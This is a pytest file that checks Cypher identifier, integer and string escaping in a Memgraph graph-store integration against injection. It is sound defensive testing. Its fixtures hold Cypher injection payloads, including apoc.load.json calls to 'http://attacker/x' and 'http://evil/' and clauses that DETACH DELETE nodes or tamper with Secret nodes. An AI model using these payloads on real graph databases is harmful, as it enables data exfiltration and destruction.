"""Tests for Cypher identifier escaping."""

import pytest

from llama_index.graph_stores.memgraph.cypher_escape import (
    escape_identifier,
    escape_int,
    escape_string_literal,
)

# Payloads taken from a Cypher-injection report against these graph stores. Each
# one previously terminated the interpolated identifier and appended clauses.
INJECTION_PAYLOADS = [
    "OWNS]->() WITH 1 AS _ CALL apoc.load.json('http://attacker/x') YIELD value "
    "WITH value, _ MATCH (x) SET x.leak = apoc.convert.toJson(value) //",
    "A`]->(N2)\tWITH\t1\tAS\tX\tMATCH\t(Z)\tDETACH\tDELETE\tZ\t//",
    "OWNS`]->(n2:`Entity`) MATCH (s:Secret) SET s.pwned = true WITH n1, r, n2 //",
    "X`]->() DETACH DELETE n1 //",
]


def test_escape_identifier_wraps_in_backticks():
    assert escape_identifier("OWNS") == "`OWNS`"


@pytest.mark.parametrize("value", ["has space", "is-a", "HAS_SPACE", "Ünïcode", "a.b"])
def test_escape_identifier_preserves_legitimate_values(value):
    """Values that are legal in a quoted identifier must keep working."""
    escaped = escape_identifier(value)
    assert escaped == f"`{value}`"


@pytest.mark.parametrize("value", ["", None, 3, b"OWNS"])
def test_escape_identifier_rejects_non_identifiers(value):
    with pytest.raises(ValueError):
        escape_identifier(value)


def test_escape_identifier_rejects_null_byte():
    with pytest.raises(ValueError):
        escape_identifier("OW\x00NS")


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_injection_payloads_cannot_terminate_the_identifier(payload):
    """
    The escaped result must be a single quoted identifier: it opens and closes
    with a backtick, and every interior backtick is doubled, so nothing in the
    payload can be parsed as Cypher.
    """
    escaped = escape_identifier(payload)
    assert escaped.startswith("`") and escaped.endswith("`")
    interior = escaped[1:-1]
    # No lone backtick remains, so the identifier cannot be closed early.
    assert "`" not in interior.replace("``", "")


@pytest.mark.parametrize(("value", "expected"), [(3, 3), ("3", 3), (0, 0), (-1, -1)])
def test_escape_int_accepts_integers(value, expected):
    assert escape_int(value, "depth") == expected


@pytest.mark.parametrize(
    "value",
    [
        "2]->() WITH 1 AS _ CREATE (:PWNED) //",
        "30 CREATE (:PWNED)",
        "2.5",
        None,
        "",
    ],
)
def test_escape_int_rejects_non_integers(value):
    with pytest.raises(ValueError):
        escape_int(value, "depth")


def test_escape_string_literal_escapes_quotes_and_backslashes():
    assert escape_string_literal("O'Brien") == "O\\'Brien"
    assert escape_string_literal("back\\slash") == "back\\\\slash"


def test_escape_string_literal_neutralises_breakout():
    escaped = escape_string_literal("x') YIELD value CALL apoc.load.json('http://evil/")
    assert "'" not in escaped.replace("\\'", "")
